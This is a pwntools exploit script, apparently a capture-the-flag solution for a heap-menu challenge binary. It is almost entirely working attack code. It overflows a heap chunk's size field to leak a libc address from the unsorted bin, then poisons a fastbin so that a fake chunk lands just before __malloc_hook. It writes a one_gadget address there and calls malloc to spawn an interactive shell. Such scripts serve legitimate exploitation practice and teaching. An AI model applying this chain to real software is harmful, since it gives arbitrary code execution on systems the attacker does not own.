from pwn import *

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary,checksec=False)
r = ROP(e)
libc = e.libc

gs = '''
break *main
continue
'''


def start():
    if (args.QEMU and args.GDB):
        p=process(['qemu-amd64', '-g', '1234', e.path])
        gdb.attach(target=('localhost',1234), exe=e.path, gdbscript=gs)
        return p
    elif (args.QEMU):
        return process(['qemu-amd64', e.path])
    elif args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    else:
        return process(e.path)


def allocate(size):
    p.sendlineafter(b'Command: ', b'1')
    p.sendlineafter(b'Size: ', b'%i' % size)


def fill(index, size, content):
    p.sendlineafter(b'Command: ', b'2')
    p.sendlineafter(b'Index: ', b'%i' % index)
    p.sendlineafter(b'Size: ', b'%i' % size)
    p.sendafter(b'Content: ', content)


def free(index):
    p.sendlineafter(b'Command: ', b'3')
    p.sendlineafter(b'Index: ', b'%i' % index)


def dump(index):
    p.sendlineafter(b'Command: ', b'4')
    p.sendlineafter(b'Index: ', b'%i' % index)
    p.recvuntil(b'Content: \n')


def make_initial_bins():
    allocate(0x18)
    allocate(0x88)
    allocate(0x18)
    fill(0, 0x18, b'A' * 0x18)
    fill(1, 0x88, b'B' * 0x88)
    fill(2, 0x18, b'C' * 0x18)
    log.info('Made Initial Chunks [(0,0x18),(1,0x88),(2,0x18)]')
    pause()


def leak_libc():
    free(1)
    log.info("Freed Chunk(1) Into Unsorted bin")
    pause()
    fill(0, 0x20, b'A' * 0x18 + p64(0x93))
    log.info("Overwrote Chunk(1) with 0x93 (Is_Mapped)")
    pause()
    allocate(0x88)
    log.info("Reallocated Chunk(1) with 0x93")
    pause()
    dump(1)
    libc.address = u64(p.recv(8)) - (libc.sym['main_arena']+88)
    log.info('Libc Leak Found in Chunk(1): 0x%x' % libc.address)
    pause()


def make_fake_chunk():
    allocate(0x68)
    fill(3, 0x68, b'D' * 0x68)
    log.info("Allocated Chunk(3) with 0x68 * D")
    pause()
    free(3)
    log.info("Freed Chunk(3), placing in 0x70 Fastbins")
    pause()
    fake_chunk = libc.sym['__malloc_hook']-35
    fill(2, 0x28, b'C' * 0x18 + p64(0x71) + p64(fake_chunk))
    log.info("Overwrite Chunk(3) with 0x71 size and FD to Fake_Chunk")
    pause()
    allocate(0x68)
    fill(3, 0x68, b'D' * 0x68)
    log.info('Reallocated Chunk(3) as 0x68 * Ds')
    log.info('Fake Chunk: 0x%x now at tail of fastbins' % fake_chunk)
    pause()


def overwrite_malloc_hook():
    one_gadget = libc.address + 0x4526a
    log.info('One Gadget: 0x%x' % one_gadget)
    allocate(0x68)
    log.info('Allocated Chunk(4) with 0x68 Chunk(4) is 35 bytes before malloc hook')
    pause()
    fill(4, 0x13 + 8, b'E' * 0x13 + p64(one_gadget))
    log.info('Overwrote Malloc Hook. Shell next')
    pause()
    allocate(1)


p = start()

make_initial_bins()
leak_libc()
make_fake_chunk()
overwrite_malloc_hook()

p.interactive()
